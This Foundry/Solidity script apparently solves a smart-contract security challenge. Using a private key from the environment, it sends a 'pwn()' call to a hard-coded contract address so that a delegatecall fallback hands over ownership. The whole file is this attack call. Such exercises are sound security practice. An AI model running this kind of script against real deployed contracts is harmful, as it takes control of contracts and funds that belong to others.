// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract DelegationScript is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address targetAddr = 0x440E489ce7024F4A1AbB5f33984F747C5396f3C7;

        vm.startBroadcast(privateKey);

        // 直接发送 calldata
        (bool success, ) = targetAddr.call(
            abi.encodeWithSignature("pwn()")
        );

        require(success, "attack failed");

        vm.stopBroadcast();
    }
}